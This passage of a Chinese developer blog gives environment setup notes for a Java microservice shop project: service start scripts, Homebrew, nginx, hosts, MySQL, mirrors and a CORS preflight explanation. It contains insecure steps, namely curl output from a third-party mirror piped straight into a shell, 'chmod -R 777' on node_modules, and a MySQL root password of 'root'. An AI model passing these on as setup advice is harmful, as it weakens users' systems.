</span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is NOT running.&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">重启</span> </span><br><span class="line">restart()&#123; </span><br><span class="line">stop </span><br><span class="line">start </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">根据输入参数,选择执行对应方法,不输入则执行使用说明</span> </span><br><span class="line">case &quot;$1&quot; in </span><br><span class="line">&quot;start&quot;) </span><br><span class="line">start </span><br><span class="line">;; </span><br><span class="line">&quot;stop&quot;) </span><br><span class="line">stop </span><br><span class="line">;; </span><br><span class="line">&quot;status&quot;) </span><br><span class="line">status </span><br><span class="line">;; </span><br><span class="line">&quot;restart&quot;) </span><br><span class="line">restart </span><br><span class="line">;; </span><br><span class="line">*) </span><br><span class="line">usage </span><br><span class="line">;; </span><br><span class="line">esac</span><br></pre></td></tr></table></figure>

<h3 id="Ly-trade"><a href="#Ly-trade" class="headerlink" title="Ly-trade"></a>Ly-trade</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">8087</span></span><br><span class="line">scp ly-trade-1.0-SNAPSHOT.jar root@mac-centos:/opt/leyou/</span><br><span class="line">scp application-product.yml root@mac-centos:/opt/leyou/config/application-ly-trade.yml</span><br><span class="line"></span><br><span class="line">cd /opt/leyou</span><br><span class="line">vi ly-trade.sh</span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span> </span><br><span class="line"><span class="meta">#</span><span class="language-bash">这里可替换为你自己的执行程序,其他代码无需更改</span> </span><br><span class="line">APP_NAME=ly-trade-1.0-SNAPSHOT.jar </span><br><span class="line">JVM=&quot;-server -Xms128m -Xmx512m -XX:PermSize=64M -XX:MaxNewSize=128m -XX:MaxPermSize=128m -Djava.awt.headless=true -XX:+CMSClassUnloadingEnabled -XX:+CMSPermGenSweepingEnabled -javaagent:/opt/leyou/agent/skywalking-agent.jar -Dskywalking.agent.service_name=ly-trade -Dskywalking.collector.backend_service=81.68.97.129:11800&quot;</span><br><span class="line">APPFILE_PATH=&quot;-Dspring.config.location=/opt/leyou/config/application-ly-trade.yml&quot;</span><br><span class="line"><span class="meta">#</span><span class="language-bash">使用说明,用来提示输入参数</span> </span><br><span class="line">usage() &#123; </span><br><span class="line">echo &quot;Usage: sh 执行脚本.sh [start|stop|restart|status]&quot; </span><br><span class="line">exit 1 </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">检查程序是否在运行</span> </span><br><span class="line">is_exist()&#123; </span><br><span class="line">pid=`ps -ef|grep $APP_NAME|grep -v grep|awk &#x27;&#123;print $2&#125;&#x27; ` </span><br><span class="line"><span class="meta">#</span><span class="language-bash">如果不存在返回1,存在返回0</span> </span><br><span class="line">if [ -z &quot;$&#123;pid&#125;&quot; ]; then </span><br><span class="line">return 1 </span><br><span class="line">else </span><br><span class="line">return 0 </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">启动方法</span> </span><br><span class="line">start()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is already running. pid=$&#123;pid&#125; .&quot; </span><br><span class="line">else </span><br><span class="line">nohup java $JVM -jar $APPFILE_PATH $APP_NAME &amp;</span><br><span class="line">fi</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">停止方法</span> </span><br><span class="line">stop()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">kill -9 $pid </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is not running&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">输出运行状态</span> </span><br><span class="line">status()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is running. Pid is $&#123;pid&#125;&quot; </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is NOT running.&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">重启</span> </span><br><span class="line">restart()&#123; </span><br><span class="line">stop </span><br><span class="line">start </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">根据输入参数,选择执行对应方法,不输入则执行使用说明</span> </span><br><span class="line">case &quot;$1&quot; in </span><br><span class="line">&quot;start&quot;) </span><br><span class="line">start </span><br><span class="line">;; </span><br><span class="line">&quot;stop&quot;) </span><br><span class="line">stop </span><br><span class="line">;; </span><br><span class="line">&quot;status&quot;) </span><br><span class="line">status </span><br><span class="line">;; </span><br><span class="line">&quot;restart&quot;) </span><br><span class="line">restart </span><br><span class="line">;; </span><br><span class="line">*) </span><br><span class="line">usage </span><br><span class="line">;; </span><br><span class="line">esac</span><br></pre></td></tr></table></figure>

<h3 id="Ly-user-service"><a href="#Ly-user-service" class="headerlink" title="Ly-user-service"></a>Ly-user-service</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">8086</span></span><br><span class="line">scp ly-user-service-1.0-SNAPSHOT.jar root@mac-centos:/opt/leyou/</span><br><span class="line">scp application-product.yml root@mac-centos:/opt/leyou/config/application-ly-user-service.yml</span><br><span class="line"></span><br><span class="line">cd /opt/leyou</span><br><span class="line">vi ly-user-service.sh</span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span> </span><br><span class="line"><span class="meta">#</span><span class="language-bash">这里可替换为你自己的执行程序,其他代码无需更改</span> </span><br><span class="line">APP_NAME=ly-user-service-1.0-SNAPSHOT.jar </span><br><span class="line">JVM=&quot;-server -Xms128m -Xmx512m -XX:PermSize=64M -XX:MaxNewSize=128m -XX:MaxPermSize=128m -Djava.awt.headless=true -XX:+CMSClassUnloadingEnabled -XX:+CMSPermGenSweepingEnabled -javaagent:/opt/leyou/agent/skywalking-agent.jar -Dskywalking.agent.service_name=ly-user-service -Dskywalking.collector.backend_service=81.68.97.129:11800&quot;</span><br><span class="line">APPFILE_PATH=&quot;-Dspring.config.location=/opt/leyou/config/application-ly-user-service.yml&quot;</span><br><span class="line"><span class="meta">#</span><span class="language-bash">使用说明,用来提示输入参数</span> </span><br><span class="line">usage() &#123; </span><br><span class="line">echo &quot;Usage: sh 执行脚本.sh [start|stop|restart|status]&quot; </span><br><span class="line">exit 1 </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">检查程序是否在运行</span> </span><br><span class="line">is_exist()&#123; </span><br><span class="line">pid=`ps -ef|grep $APP_NAME|grep -v grep|awk &#x27;&#123;print $2&#125;&#x27; ` </span><br><span class="line"><span class="meta">#</span><span class="language-bash">如果不存在返回1,存在返回0</span> </span><br><span class="line">if [ -z &quot;$&#123;pid&#125;&quot; ]; then </span><br><span class="line">return 1 </span><br><span class="line">else </span><br><span class="line">return 0 </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">启动方法</span> </span><br><span class="line">start()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is already running. pid=$&#123;pid&#125; .&quot; </span><br><span class="line">else </span><br><span class="line">nohup java $JVM -jar $APPFILE_PATH $APP_NAME &amp;</span><br><span class="line">fi</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">停止方法</span> </span><br><span class="line">stop()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">kill -9 $pid </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is not running&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">输出运行状态</span> </span><br><span class="line">status()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is running. Pid is $&#123;pid&#125;&quot; </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is NOT running.&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">重启</span> </span><br><span class="line">restart()&#123; </span><br><span class="line">stop </span><br><span class="line">start </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">根据输入参数,选择执行对应方法,不输入则执行使用说明</span> </span><br><span class="line">case &quot;$1&quot; in </span><br><span class="line">&quot;start&quot;) </span><br><span class="line">start </span><br><span class="line">;; </span><br><span class="line">&quot;stop&quot;) </span><br><span class="line">stop </span><br><span class="line">;; </span><br><span class="line">&quot;status&quot;) </span><br><span class="line">status </span><br><span class="line">;; </span><br><span class="line">&quot;restart&quot;) </span><br><span class="line">restart </span><br><span class="line">;; </span><br><span class="line">*) </span><br><span class="line">usage </span><br><span class="line">;; </span><br><span class="line">esac</span><br></pre></td></tr></table></figure>



<h1 id="MACOS"><a href="#MACOS" class="headerlink" title="MACOS"></a>MACOS</h1><h2 id="安装jdk8-2"><a href="#安装jdk8-2" class="headerlink" title="安装jdk8"></a>安装jdk8</h2><p>下载安装包</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /Library/Java/JavaVirtualMachines/jdk1.8.0_211.jdk/Contents/Home</span><br><span class="line">sudo vi .bash_profile</span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk1.8.0_211.jdk/Contents/Home</span><br><span class="line"><span class="built_in">source</span> .bash_profile</span><br><span class="line">java -version</span><br></pre></td></tr></table></figure>

<h2 id="启动管理员页面"><a href="#启动管理员页面" class="headerlink" title="启动管理员页面"></a>启动管理员页面</h2><h3 id="安装brew"><a href="#安装brew" class="headerlink" title="安装brew"></a>安装brew</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">安装</span></span><br><span class="line">/bin/zsh -c &quot;$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)&quot;</span><br><span class="line"><span class="meta">#</span><span class="language-bash">卸载</span></span><br><span class="line">/bin/zsh -c &quot;$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/HomebrewUninstall.sh)&quot;</span><br><span class="line">/bin/bash -c &quot;$(curl -fsSL https://cdn.jsdelivr.net/gh/ineo6/homebrew-install/uninstall.sh)&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">设置镜像源</span></span><br><span class="line">git -C &quot;$(brew --repo)&quot; remote set-url origin https://mirrors.ustc.edu.cn/brew.git</span><br><span class="line"></span><br><span class="line">git -C &quot;$(brew --repo homebrew/core)&quot; remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.git</span><br><span class="line"></span><br><span class="line">git -C &quot;$(brew --repo homebrew/cask)&quot; remote set-url origin https://mirrors.ustc.edu.cn/homebrew-cask.git</span><br><span class="line"></span><br><span class="line">brew update</span><br><span class="line"><span class="meta">#</span><span class="language-bash">恢复镜像源</span></span><br><span class="line">git -C &quot;$(brew --repo)&quot; remote set-url origin https://github.com/Homebrew/brew.git</span><br><span class="line"></span><br><span class="line">git -C &quot;$(brew --repo homebrew/core)&quot; remote set-url origin https://github.com/Homebrew/homebrew-core.git</span><br><span class="line"></span><br><span class="line">git -C &quot;$(brew --repo homebrew/cask)&quot; remote set-url origin https://github.com/Homebrew/homebrew-cask.git</span><br><span class="line"></span><br><span class="line">brew update</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">brew install nodejs</span><br><span class="line"><span class="meta">#</span><span class="language-bash">获取nodejs模块安装目录访问权限</span></span><br><span class="line">sudo chmod -R 777 /usr/local/lib/node_modules/</span><br><span class="line"></span><br><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br><span class="line">cnpm install webpack -g</span><br><span class="line">cnpm install vue-cli -g</span><br><span class="line"></span><br><span class="line">cd leyou-manage</span><br><span class="line">npm run serve</span><br></pre></td></tr></table></figure>

<p>VUE 项目报错:sh: &#x2F;Users&#x2F;huangmingwang&#x2F;leyou-manage&#x2F;node_modules&#x2F;.bin&#x2F;vue-cli-service: Permission denied</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod 777 /Users/huangmingwang/leyou-manage/node_modules/.bin/vue-cli-service</span><br><span class="line">cd /Users/huangmingwang/leyou/leyou-manage</span><br><span class="line">npm run serve</span><br></pre></td></tr></table></figure>

<h2 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">brew install nginx</span><br><span class="line">brew services start nginx <span class="comment">#启动nginx</span></span><br><span class="line">brew services stop nginx </span><br><span class="line">brew services restart nginx</span><br><span class="line">brew <span class="built_in">ls</span> nginx</span><br><span class="line"><span class="built_in">cd</span> /usr/local/etc/nginx/servers</span><br><span class="line">vi leyou.conf</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  api.leyou.com;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">                proxy_pass   http://ly-gateway:10010;</span><br><span class="line">                proxy_connect_timeout 600;</span><br><span class="line">                proxy_read_timeout 5000;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  manage.leyou.com;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">                proxy_pass   http://manage.leyou.com:9001;</span><br><span class="line">                proxy_connect_timeout 600;</span><br><span class="line">                proxy_read_timeout 5000;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  registry.leyou.com;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">                proxy_pass   http://ly-registry:10086;</span><br><span class="line">                proxy_connect_timeout 600;</span><br><span class="line">                proxy_read_timeout 5000;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">        listen   80;</span><br><span class="line">        server_name  www.leyou.com;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">        root  /Users/huangmingwang/leyou-portal;</span><br><span class="line">        &#125;</span><br><span class="line">        location /item &#123;</span><br><span class="line">                <span class="comment"># 携带hosts地址，避免因代理导致host丢失</span></span><br><span class="line">                proxy_set_header Host       <span class="variable">$host</span>;</span><br><span class="line">            proxy_pass   http://ly-linux;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="安装rabbitmq"><a href="#安装rabbitmq" class="headerlink" title="安装rabbitmq"></a>安装rabbitmq</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">brew install rabbitmq</span><br><span class="line"></span><br><span class="line">rabbitmq-server # 前台运行</span><br><span class="line"></span><br><span class="line">brew services start rabbitmq # 后台运行</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="安装switchhosts"><a href="#安装switchhosts" class="headerlink" title="安装switchhosts"></a>安装switchhosts</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">##</span><br><span class="line"># Host Database</span><br><span class="line">#</span><br><span class="line"># localhost is used to configure the loopback interface</span><br><span class="line"># when the system is booting. Do not change this entry.</span><br><span class="line">##</span><br><span class="line">127.0.0.1 localhost</span><br><span class="line">127.0.0.1 ly-gateway</span><br><span class="line">127.0.0.1 ly-registry</span><br><span class="line">192.168.58.80 ly-mysql</span><br><span class="line">192.168.58.80 ly-redis</span><br><span class="line">192.168.58.80 ly-mq</span><br><span class="line">192.168.58.80 ly-es</span><br><span class="line">192.168.58.80 ly-canal</span><br><span class="line">192.168.58.80 ly-linux</span><br><span class="line">192.168.58.80 ly-mongo</span><br><span class="line">127.0.0.1 api.leyou.com</span><br><span class="line">127.0.0.1 manage.leyou.com</span><br><span class="line">127.0.0.1 www.leyou.com</span><br><span class="line">127.0.0.1 image.leyou.com</span><br><span class="line">127.0.0.1 registry.leyou.com</span><br><span class="line">140.82.112.4 github.com</span><br><span class="line">255.255.255.255 broadcasthost</span><br><span class="line">::1 localhost</span><br><span class="line"># Parallels Desktop</span><br><span class="line"># 127.0.0.1 download.parallels.com</span><br><span class="line"># 127.0.0.1 toolbox.parallels.com</span><br><span class="line"># 127.0.0.1 desktop.parallels.com</span><br><span class="line"># 127.0.0.1 update.parallels.com</span><br><span class="line"># 127.0.0.1 account.parallels.com</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="安装mysql"><a href="#安装mysql" class="headerlink" title="安装mysql"></a>安装mysql</h2><p>若不考虑版本直接执行以下命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">若不考虑版本直接执行以下命令</span></span><br><span class="line">brew install mysql</span><br><span class="line"><span class="meta">#</span><span class="language-bash">要选择版本只要加上@版本即可</span></span><br><span class="line">brew install mysql@5.7 </span><br><span class="line"><span class="meta">#</span><span class="language-bash">启动</span></span><br><span class="line">mysql.server start</span><br><span class="line"><span class="meta">#</span><span class="language-bash">关闭</span></span><br><span class="line">mysql.server stop</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">登录mysql,默认情况下免密登录</span></span><br><span class="line">mysql -u root</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">修改密码 8.0</span></span><br><span class="line">alter user &#x27;root&#x27;@&#x27;localhost&#x27; identified with &#x27;asdfghjkl&#x27; by &#x27;root&#x27;;</span><br></pre></td></tr></table></figure>

<h2 id="mac-修改pip镜像为国内镜像"><a href="#mac-修改pip镜像为国内镜像" class="headerlink" title="mac 修改pip镜像为国内镜像"></a>mac 修改pip镜像为国内镜像</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">如果没有则创建</span></span><br><span class="line">cd ~/.pip/</span><br><span class="line">vim pip.conf</span><br><span class="line"></span><br><span class="line">[global]</span><br><span class="line">index-url = [http://mirrors.aliyun.com/pypi/simple/](https://link.jianshu.com/?t=http://mirrors.aliyun.com/pypi/simple/)</span><br><span class="line">[install]</span><br><span class="line">trusted-host=mirrors.aliyun.com</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">或者</span></span><br><span class="line">[global]</span><br><span class="line">index-url = [https://pypi.tuna.tsinghua.edu.cn/simple](https://link.jianshu.com/?t=https://pypi.tuna.tsinghua.edu.cn/simple)</span><br><span class="line">[install]</span><br><span class="line">trusted-host=pypi.tuna.tsinghua.edu.cn</span><br></pre></td></tr></table></figure>

<h2 id="Parallels-Desktop共享网络host-only桥接网络"><a href="#Parallels-Desktop共享网络host-only桥接网络" class="headerlink" title="Parallels Desktop共享网络host-only桥接网络"></a>Parallels Desktop共享网络host-only桥接网络</h2><h3 id="共享网络"><a href="#共享网络" class="headerlink" title="共享网络"></a>共享网络</h3><p>10.211.55.1 - 10.211.55.254 </p>
<p>虚拟机之间可以ping通，主机与虚拟机之间也能ping通，主机能上外网，则虚拟机能上网。</p>
<p>当主机关闭网络时，主机不能连接虚拟机，虚拟机之间能通信。</p>
<p>但是与主机在同一区域内其它主机访问不了虚拟机。</p>
<h3 id="host-only"><a href="#host-only" class="headerlink" title="host-only"></a>host-only</h3><p>10.37.129.1-10.37.129.254</p>
<p>虚拟机直接能ping通，但是虚拟机ping不同主机，主机能ping通虚拟机，虚拟机不能上网。</p>
<h3 id="桥接网络"><a href="#桥接网络" class="headerlink" title="桥接网络"></a>桥接网络</h3><p>虚拟机和主机在同一网段，相当于是一台与主机处于同一局域网内的独立主机。</p>
<p>当主机关闭网络时，主机连接不上虚拟机，虚拟机之间也不能通信。</p>
<h2 id="idea配置aliyun镜像"><a href="#idea配置aliyun镜像" class="headerlink" title="idea配置aliyun镜像"></a>idea配置aliyun镜像</h2><p>没有settings.xml文件就创建</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">1 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>有的话将下面部分插入即可</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>alimaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>aliyun maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>uk<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>Human Readable Name for this Mirror.<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://uk.maven.org/maven2/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>CN<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>OSChina Central<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.oschina.net/content/groups/public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>nexus<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>internal nexus repository<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- &lt;url&gt;http://192.168.1.100:8081/nexus/content/groups/public/&lt;/url&gt;--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://repo.maven.apache.org/maven2<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="IDEA中设置Run-Dashboard"><a href="#IDEA中设置Run-Dashboard" class="headerlink" title="IDEA中设置Run Dashboard"></a>IDEA中设置Run Dashboard</h2><p>设置打开Run Dashboard （View-》Tool Windows-》Run Dashboard）</p>
<p>如果上述的选项里没有Run Dashboard，可以在工程目录下找.idea文件夹下的workspace.xml，在其中增加如下组件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">component</span> <span class="attr">name</span>=<span class="string">&quot;RunDashboard&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;configurationTypes&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">set</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;SpringBootApplicationConfigurationType&quot;</span> /&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;ruleStates&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">RuleState</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ConfigurationTypeDashboardGroupingRule&quot;</span> /&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">RuleState</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">RuleState</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;StatusDashboardGroupingRule&quot;</span> /&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">RuleState</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">component</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="idea设置"><a href="#idea设置" class="headerlink" title="idea设置"></a>idea设置</h2><ul>
<li><p>alibaba java coding guidelines </p>
</li>
<li><p>设置代码模版 code folding</p>
</li>
<li><p>配置自动导包</p>
</li>
</ul>
<h2 id="安装tomcat"><a href="#安装tomcat" class="headerlink" title="安装tomcat"></a>安装tomcat</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">brew install tomcat</span><br><span class="line">brew ls tomcat</span><br><span class="line"><span class="meta">#</span><span class="language-bash">启动</span></span><br><span class="line">brew services start tomcat</span><br><span class="line"><span class="meta">#</span><span class="language-bash">停止</span></span><br><span class="line">brew services stop tomcat</span><br></pre></td></tr></table></figure>

<h2 id="Option"><a href="#Option" class="headerlink" title="Option"></a>Option</h2><h3 id="浏览器级行为"><a href="#浏览器级行为" class="headerlink" title="浏览器级行为"></a>浏览器级行为</h3><p>这个概念听着有点耳生，嗯是我自己这么说的。。。我们可以把浏览器自主发起的行为称之为<strong>“浏览器级行为”</strong>。之所以说options是一种浏览器级行为，是因为在<strong>某些情况</strong>下，普通的get或者post请求回首先自动发起一次options请求，当options请求成功返回后，真正的ajax请求才会再次发起。</p>
<p>再来看下这个“某些情况下”都是什么情况？</p>
<p>1、跨域请求，非跨域请求不会出现options请求<br>2、自定义请求头<br>3、请求头中的content-type是application&#x2F;x-www-form-urlencoded，multipart&#x2F;form-data，text&#x2F;plain之外的格式</p>
<p>当满足条件12或者13的时候，简单的ajax请求就会出现options请求，有没有感觉到一点同源策略的意思，个人理解这个就是浏览器底层对于同源策略的一个具体实现。首先得到服务器端的确认，才能继续下一步的操作，这也是为什么options请求也被叫做“预检”请求的原因吧。</p>
<h3 id="出现之后怎么处理？服务端怎么响应这个？"><a href="#出现之后怎么处理？服务端怎么响应这个？" class="headerlink" title="出现之后怎么处理？服务端怎么响应这个？"></a>出现之后怎么处理？服务端怎么响应这个？</h3><p>这个基本思路就是server端在接收到请求的时候，先去判断下是不是options请求，判断下来源，没问题的时候返回个200之类的成功就可以了。不过由于没做个具体的demo之类的，这个就不细说了。</p>
<h2 id="安装python3"><a href="#安装python3" class="headerlink" title="安装python3"></a>安装python3</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">Homebrew 会为您安装 pip3 。</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">pip3 是Homebrew版Python 3的 pip 的别名。</span></span><br><span class="line">brew install python</span><br><span class="line"><span class="meta">#</span><span class="language-bash">将打开通过HomeBrew安装的Python解释器。</span></span><br><span class="line">python</span><br><span class="line"><span class="meta">#</span><span class="language-bash">将会打开使用Homebrew安装的Python 2解释器（如果有）。</span></span><br><span class="line">python2</span><br><span class="line"><span class="meta">#</span><span class="language-bash">将会打开使用Homebrew安装的Python 3解释器（如果有）。</span></span><br><span class="line">python3</span><br></pre></td></tr></table></figure>

